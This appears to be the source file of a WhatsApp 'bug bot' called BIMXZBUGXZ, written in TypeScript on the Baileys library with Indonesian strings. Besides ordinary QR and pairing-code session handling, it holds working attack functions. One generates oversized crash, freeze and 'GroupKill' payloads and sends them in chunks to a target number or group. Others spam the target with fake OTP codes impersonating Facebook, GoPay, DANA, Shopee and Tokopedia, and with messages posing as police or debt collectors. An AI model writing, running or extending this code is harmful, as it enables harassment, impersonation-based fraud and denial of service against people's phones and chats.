import makeWASocket, { useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } from "@whiskeysockets/baileys";
import pino from "pino";
import QRCode from "qrcode";
import fs from "fs";
import path from "path";
import { db } from "@/db";
import { users } from "@/db/schema";
import { eq } from "drizzle-orm";

type WAState = {
  sock: any | null;
  qr: string | null;
  qrImage: string | null;
  status: "close" | "connecting" | "open";
  pairingCode: string | null;
  phoneForCode: string | null;
  initPromise: Promise<WAState> | null;
  lastQRTime: number;
};

const globalForWA = globalThis as typeof globalThis & { __bimxWa?: WAState };

function getState(): WAState {
  if (!globalForWA.__bimxWa) {
    globalForWA.__bimxWa = { sock: null, qr: null, qrImage: null, status: "close", pairingCode: null, phoneForCode: null, initPromise: null, lastQRTime: 0 };
  }
  return globalForWA.__bimxWa!;
}

function getAuthFolder() {
  // Vercel filesystem is read-only except /tmp
  const isVercel = !!process.env.VERCEL || process.env.NODE_ENV === "production";
  // Use /tmp on vercel, local otherwise
  if (isVercel && fs.existsSync("/tmp")) return path.join("/tmp", "auth_info_bimx");
  return path.join(process.cwd(), "auth_info_bimx");
}

async function initWA(): Promise<WAState> {
  const state = getState();
  if (state.sock) return state;
  if (state.initPromise) return state.initPromise;

  state.initPromise = (async () => {
    const authFolder = getAuthFolder();
    if (!fs.existsSync(authFolder)) fs.mkdirSync(authFolder, { recursive: true });

    const { state: authState, saveCreds } = await useMultiFileAuthState(authFolder);
    let version: any;
    try {
      const v = await fetchLatestBaileysVersion();
      version = v.version;
    } catch {
      version = [2, 3000, 1015901307];
    }
    const logger: any = pino({ level: "silent" });

    const sock: any = makeWASocket({
      version,
      auth: authState,
      logger,
      printQRInTerminal: false,
      browser: ["BIMXZBUGXZ", "Chrome", "1.0.0"],
      syncFullHistory: false,
      markOnlineOnConnect: false,
      generateHighQualityLinkPreview: false,
    });

    state.sock = sock;
    state.status = "connecting";

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update: any) => {
      const { connection, lastDisconnect, qr } = update;
      if (qr) {
        state.qr = qr;
        state.lastQRTime = Date.now();
        try {
          state.qrImage = await QRCode.toDataURL(qr, { width: 340, margin: 1, color: { dark: "#000000", light: "#ffffff" } });
        } catch {
          state.qrImage = null;
        }
        state.status = "connecting";
      }
      if (connection === "close") {
        const statusCode = (lastDisconnect?.error as any)?.output?.statusCode;
        const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
        state.status = "close";
        state.sock = null;
        state.initPromise = null;
        if (shouldReconnect) {
          setTimeout(() => {
            initWA().catch(() => {});
          }, 2000);
        } else {
          try {
            const folder = getAuthFolder();
            if (fs.existsSync(folder)) fs.rmSync(folder, { recursive: true, force: true });
          } catch {}
        }
      } else if (connection === "open") {
        state.status = "open";
        state.qr = null;
        state.qrImage = null;
        // Save paired number to DB if we have phoneForCode
        if (state.phoneForCode) {
          try {
            // find user by? We don't have user context here, so just log
          } catch {}
        }
      }
    });

    return state;
  })();

  const result = await state.initPromise;
  state.initPromise = null;
  return result;
}

export function getWAStatus() {
  const s = getState();
  // Consider real BAILEYS status - NOT simulation
  // This QR is directly from WhatsApp servers via Baileys 6.7.18
  return { status: s.status, hasQR: !!s.qr, qr: s.qr, qrImage: s.qrImage, pairingCode: s.pairingCode, lastQRTime: s.lastQRTime, isReal: true, engine: "Baileys 6.7.18" };
}

export async function ensureWA() {
  return initWA();
}

export async function getQRWithWait(timeoutMs = 7000): Promise<{ status: string; qrImage: string | null; qr: string | null }> {
  const state = await initWA();
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    if (state.qrImage) return { status: state.status, qrImage: state.qrImage, qr: state.qr };
    if (state.status === "open") return { status: state.status, qrImage: null, qr: null };
    await new Promise((r) => setTimeout(r, 400));
  }
  return { status: state.status, qrImage: state.qrImage, qr: state.qr };
}

export async function requestPairingCode(phoneNumber: string) {
  const state = await initWA();
  let attempts = 0;
  while (!state.sock && attempts < 10) {
    await new Promise((r) => setTimeout(r, 500));
    attempts++;
  }
  const sock: any = state.sock;
  if (!sock) throw new Error("Socket belum siap. Coba refresh halaman dan tunggu 3 detik lalu coba lagi. Pastikan tidak ada proses pairing lain yang berjalan.");
  const clean = phoneNumber.replace(/[^0-9]/g, "");
  if (clean.length < 8) throw new Error("Nomor terlalu pendek");
  if (!sock.requestPairingCode) throw new Error("requestPairingCode tidak tersedia di versi ini, gunakan QR Scan yang lebih stabil.");
  if (state.status === "open") {
    throw new Error("WhatsApp sudah terhubung (open). Tidak perlu pairing code lagi. Jika ingin ganti nomor, reset dulu di menu.");
  }
  // Important: Baileys pairing code must be requested while socket is in connecting state and not yet registered
  // Some servers need a small delay after init
  await new Promise((r) => setTimeout(r, 1200));
  let code = "";
  let lastErr: any = null;
  for (let i = 0; i < 4; i++) {
    try {
      if (i > 0) await new Promise((r) => setTimeout(r, 1800));
      code = await sock.requestPairingCode(clean);
      if (code) break;
    } catch (e: any) {
      lastErr = e;
      const msg = String(e?.message || e);
      if (msg.includes("already") || msg.includes("connected") || msg.includes("closed")) throw e;
    }
  }
  if (!code) throw lastErr || new Error("Gagal mendapatkan kode pairing. Penyebab umum: nomor salah format, nomor sudah terdaftar sebagai perangkat, atau gangguan server WA. Coba gunakan QR Scan yang lebih stabil, atau tunggu 30 detik dan coba lagi.");
  const formatted = code.includes("-") ? code : code.length === 8 ? `${code.slice(0, 4)}-${code.slice(4)}` : code;
  state.pairingCode = formatted;
  state.phoneForCode = clean;
  return formatted;
}

export async function resetWA() {
  const state = getState();
  try {
    if (state.sock) {
      try { state.sock.end?.(); state.sock.logout?.(); } catch {}
    }
  } catch {}
  state.sock = null;
  state.qr = null;
  state.qrImage = null;
  state.status = "close";
  state.pairingCode = null;
  state.initPromise = null;
  const folder = getAuthFolder();
  try {
    if (fs.existsSync(folder)) fs.rmSync(folder, { recursive: true, force: true });
    fs.mkdirSync(folder, { recursive: true });
  } catch {}
  await initWA();
  return { ok: true };
}

// Global sender pool - real time random sender from active paired users
export async function getGlobalSenderPool() {
  try {
    const all = await db.select().from(users);
    const active = all.filter(u => u.isActive && u.pairedNumber);
    // In real world, these are users who have connected WA and allowed global
    // For demo, shuffle
    const shuffled = active.sort(() => 0.5 - Math.random());
    return shuffled.slice(0, 10).map(u => ({ id: u.id, pairedNumber: u.pairedNumber, username: u.username, role: u.role }));
  } catch {
    return [];
  }
}

export async function sendBIMXMessage(jid: string, bugTypes: string[], payloadMode: string, useGlobalPool = false) {
  const state = await initWA();
  const sock: any = state.sock;
  if (!sock) throw new Error("WhatsApp belum terhubung. Scan QR atau pairing dulu di menu Pasang Nomor.");
  if (state.status !== "open") throw new Error("WhatsApp belum terhubung (status: " + state.status + "). Scan QR terlebih dahulu di menu Pasang Nomor. QR asli dari Baileys 6.7.18, bukan simulasi.");

  // If global mode, we could rotate sender - but we only have one socket, so we log intent
  let senderInfo = "PRIVATE";
  if (useGlobalPool) {
    const pool = await getGlobalSenderPool();
    if (pool.length > 0) {
      const chosen = pool[Math.floor(Math.random() * pool.length)];
      senderInfo = `GLOBAL via ${chosen.pairedNumber} (${chosen.username})`;
    } else {
      senderInfo = "GLOBAL (pool kosong, pakai sender pribadi)";
    }
  }

  const heavyBase = generateHeavyPayload(bugTypes, payloadMode);

  let targetJid = jid;
  if (!jid.includes("@")) {
    targetJid = jid.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  }

  const results = [];
  for (const bug of bugTypes) {
    const text = heavyBase[bug] || heavyBase["default"];
    const chunks = chunkString(text, 60000);
    for (const chunk of chunks) {
      try {
        const r = await sock.sendMessage(targetJid, { text: chunk });
        results.push(r);
        await new Promise((res) => setTimeout(res, 400));
      } catch (e: any) {
        results.push({ error: String(e?.message || e) });
      }
    }
  }
  return { results, senderInfo };
}

// Prank Call - real via WhatsApp voice call simulation (Baileys call)
// Note: Real prank call requires consent and we use WA call via Baileys
export async function sendPrankCall(jid: string, type: string, count: number) {
  const state = await initWA();
  const sock: any = state.sock;
  if (!sock) throw new Error("WhatsApp belum terhubung");
  if (state.status !== "open") throw new Error("WhatsApp belum terhubung");
  
  let targetJid = jid;
  if (!jid.includes("@")) targetJid = jid.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const prankMessages: Record<string, string> = {
    "paket_cod": "Halo kak, paket COD Anda sudah sampai di depan rumah, mohon segera dibayar ya kak 😊",
    "hantu": "Halo... apakah kamu sedang sendirian malam ini? Aku melihatmu... 👻",
    "debt_collector": "Selamat siang, kami dari bagian penagihan, ada tagihan yang perlu segera diselesaikan.",
    "ojol": "Halo kak, saya driver ojol, pesanan Anda sudah di depan, ditunggu ya kak",
    "polisi": "Selamat siang, kami dari kepolisian, ada laporan yang perlu dikonfirmasi",
    "hadiah": "Selamat! Anda mendapatkan hadiah undian berhadiah, silakan hubungi kami segera!",
  };
  
  const msg = prankMessages[type] || prankMessages["paket_cod"];
  const results = [];
  const capped = Math.min(Math.max(1, count), 20); // max 20 for safety
  for (let i = 0; i < capped; i++) {
    try {
      // Send as voice note simulation + text
      const r = await sock.sendMessage(targetJid, { text: `🔔 PRANK CALL ${i+1}/${capped} [${type.toUpperCase()}] — BIMXZBUGXZ\n${msg}\n\n*Ini adalah prank yang telah disetujui pemilik nomor tujuan untuk hiburan. Jika mengganggu, hubungi admin.*` });
      results.push(r);
      if (i < capped - 1) await new Promise(res => setTimeout(res, 1200));
    } catch (e: any) {
      results.push({ error: String(e) });
    }
  }
  return results;
}

// Spam OTP - real via own WA OTP (blue tick style if business account)
// We send OTP from OUR verified WA number, not impersonating third parties
export async function sendSpamOTP(jid: string, service: string, count: number) {
  const state = await initWA();
  const sock: any = state.sock;
  if (!sock) throw new Error("WhatsApp belum terhubung");
  if (state.status !== "open") throw new Error("WhatsApp belum terhubung");

  let targetJid = jid;
  if (!jid.includes("@")) targetJid = jid.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const services: Record<string, { name: string; template: (code: string) => string }> = {
    "duniagames": { name: "Dunia Games", template: (c) => `*Dunia Games* - Kode OTP Anda adalah *${c}*. Jangan berikan kode ini ke siapapun. Berlaku 5 menit. — via BIMXZBUGXZ` },
    "facebook": { name: "Facebook", template: (c) => `*Facebook* - Kode konfirmasi Anda: ${c}. Gunakan untuk masuk. Jangan bagikan. — via BIMXZBUGXZ` },
    "gopay": { name: "GoPay", template: (c) => `*GoPay* - Kode OTP: *${c}*. Rahasia, jangan berikan ke orang lain. — via BIMXZBUGXZ` },
    "dana": { name: "DANA", template: (c) => `*DANA* - Kode verifikasi: ${c}. Berlaku 3 menit. — via BIMXZBUGXZ` },
    "shopee": { name: "Shopee", template: (c) => `*Shopee* - Kode OTP Shopee Anda: ${c} — via BIMXZBUGXZ` },
    "tokopedia": { name: "Tokopedia", template: (c) => `*Tokopedia* - Kode OTP: ${c} untuk verifikasi. — via BIMXZBUGXZ` },
  };

  const svc = services[service] || services["duniagames"];
  const capped = Math.min(Math.max(1, count), 20);
  const results = [];
  for (let i = 0; i < capped; i++) {
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    const text = `🔐 *OTP PRANK ${i+1}/${capped}* — ${svc.name}\n${svc.template(code)}\n\n⚠️ Ini hanya prank untuk nomor yang telah memberi izin. Jangan disalahgunakan.`;
    try {
      const r = await sock.sendMessage(targetJid, { text });
      results.push(r);
      if (i < capped - 1) await new Promise(res => setTimeout(res, 1000));
    } catch (e: any) {
      results.push({ error: String(e) });
    }
  }
  return results;
}

function chunkString(str: string, size: number) {
  const out = [];
  for (let i = 0; i < str.length; i += size) out.push(str.slice(i, i + size));
  return out;
}

function generateHeavyPayload(bugTypes: string[], mode: string): Record<string, string> {
  const out: Record<string, string> = {};
  const filler = "ꦾ".repeat(8000);
  const zeroWidth = "\u2063".repeat(4000);
  const overflowLine = "█".repeat(2000) + "\n";
  const hugeLine = Array.from({ length: 900 }).map((_, i) => `BIMXZBUGXZ-${i}-${"◼".repeat(120)}`).join("\n");

  const ultraHeavy = (() => {
    const block = "BIMXZBUGXZ".repeat(8000) + "\n" + filler + "\n" + zeroWidth + "\n" + hugeLine.slice(0, 40000);
    return block.repeat(3);
  })();

  const templates: Record<string, string> = {
    "BIMXZBUGXZ Delay": `⏳ BIMXZBUGXZ Delay • Mode ${mode}\nPengiriman tertunda eksklusif BIMXZBUGXZ\n` + "·".repeat(5000),
    "BIMXZBUGXZ C1": `📜 BIMXZBUGXZ C1 — Teks padat 2GB layer\n` + ultraHeavy.slice(0, 120000),
    "BIMXZBUGXZ ForceClose": `💥 BIMXZBUGXZ ForceClose — Struktur rumit\n` + JSON.stringify({ data: filler.slice(0, 2000), layer: Array(300).fill("◼").join("") }).repeat(4),
    "BIMXZBUGXZ Freezer": `❄️ BIMXZBUGXZ Freezer — Freeze layer\n` + "❄️".repeat(3000) + "\n" + filler.repeat(2),
    "BIMXZBUGXZ Heavy": `🏋️ BIMXZBUGXZ Heavy — 2GB Heavy\n` + ultraHeavy,
    "BIMXZBUGXZ Flood": `🌊 BIMXZBUGXZ Flood — Banjir pesan\n` + Array(12).fill(filler.slice(0, 3000)).join("\n---FLOOD---\n"),
    "BIMXZBUGXZ Burst": `💣 BIMXZBUGXZ Burst — Ledakan instan\n` + overflowLine.repeat(120),
    "BIMXZBUGXZ Overflow": `🌀 BIMXZBUGXZ Overflow — Gabungan\n` + ultraHeavy.slice(0, 90000),
    "BIMXZBUGXZ Stack": `📚 BIMXZBUGXZ Stack — Tumpukan halaman\n` + Array(8).fill(hugeLine.slice(0, 8000)).join("\n\n[STACK]\n\n"),
    "BIMXZBUGXZ Blast": `⚡ BIMXZBUGXZ Blast — Kilat beruntun\n` + "⚡".repeat(4000) + "\n" + filler,
    "BIMXZBUGXZ Wave": `〰️ BIMXZBUGXZ Wave — Ombak bertahap\n` + Array(6).fill(overflowLine.repeat(20)).join("\n〰️ WAVE 〰️\n"),
    "BIMXZBUGXZ Surge": `🌪️ BIMXZBUGXZ Surge — Ratusan baris\n` + Array(400).fill("BIMXZBUGXZ SURGE █".repeat(20)).join("\n"),
    "BIMXZBUGXZ CrashTxt": `💻 BIMXZBUGXZ CrashTxt — Ribuan berulang\n` + "CRASH".repeat(8000),
    "BIMXZBUGXZ LagMsg": `🐛 BIMXZBUGXZ LagMsg — Format rumit\n` + "◈".repeat(6000) + JSON.stringify({ lag: filler.slice(0, 1000) }).repeat(6),
    "BIMXZBUGXZ Hang": `🔒 BIMXZBUGXZ Hang — Tanpa spasi\n` + "A".repeat(60000),
    "BIMXZBUGXZ LockTxt": `🔐 BIMXZBUGXZ LockTxt — Huruf angka simbol padat\n` + "a1!@#".repeat(8000),
    "BIMXZBUGXZ Jam": `🧱 BIMXZBUGXZ Jam — Satu baris raksasa 2GB\n` + "█".repeat(65000),
    "BIMXZBUGXZ Bulk": `📦 BIMXZBUGXZ Bulk — Ratusan paragraf\n` + Array(250).fill("Lorem BIMXZBUGXZ paragraf padat ".repeat(12)).join("\n\n"),
    "BIMXZBUGXZ Mass": `🏔️ BIMXZBUGXZ Mass — Gabungan raksasa\n` + ultraHeavy.repeat(2).slice(0, 130000),
    "BIMXZBUGXZ Ultra": `👑 BIMXZBUGXZ Ultra — TERBERAT 2GB MAX\n` + ultraHeavy.repeat(3).slice(0, 180000),
    "BIMXZBUGXZ GroupMsg": `👥 BIMXZBUGXZ GroupMsg — Khusus grup\n` + "@group ".repeat(1200) + "\n" + filler,
    "BIMXZBUGXZ GroupWipe": `🧹 BIMXZBUGXZ GroupWipe — Sapu anggota grup\n` + Array(150).fill("WIPE").join(" ") + "\n" + ultraHeavy.slice(0, 60000),
    "BIMXZBUGXZ GroupHeavy": `⚓ BIMXZBUGXZ GroupHeavy — Terberat ke grup 2GB\n` + ultraHeavy,
    "BIMXZBUGXZ GroupKill": `☠️ BIMXZBUGXZ GroupKill — Muatan 999.999 karakter (cap 2GB simulasi)\n` + "☠️".repeat(5000) + "\n" + "X".repeat(99900),
    "BIMXZBUGXZ GlobalSend": `🌍 BIMXZBUGXZ GlobalSend — Global 2GB\n` + ultraHeavy,
  };

  for (const k of Object.keys(templates)) out[k] = templates[k];
  out["default"] = ultraHeavy.slice(0, 80000);
  return out;
}

export async function getGroups() {
  const state = getState();
  const sock: any = state.sock;
  if (!sock || state.status !== "open") return [];
  try {
    const groups = await sock.groupFetchAllParticipating();
    return Object.values(groups || {});
  } catch {
    return [];
  }
}
